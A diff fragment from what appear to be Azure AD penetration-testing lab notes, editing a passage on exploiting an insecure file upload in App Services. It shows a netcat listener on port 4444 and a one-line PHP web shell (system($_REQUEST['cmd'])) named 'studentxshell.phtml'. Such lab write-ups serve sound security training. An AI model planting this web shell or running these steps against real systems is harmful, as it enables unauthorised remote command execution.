@@ -450,7 +450,7 @@ C:\AzAD\Tools\netcat-win32-1.12\nc64.exe -lvp 4444
 
 ## App Services
 ### Insecure File Upload
-We find a vulnerable form to upload files into, now lets upload hilarious shell:-
+We find a vulnerable form to upload files into, now lets upload hilarious shell (`studentxshell.phtml`):-
 ```
 <?php 
 system($_REQUEST['cmd']);
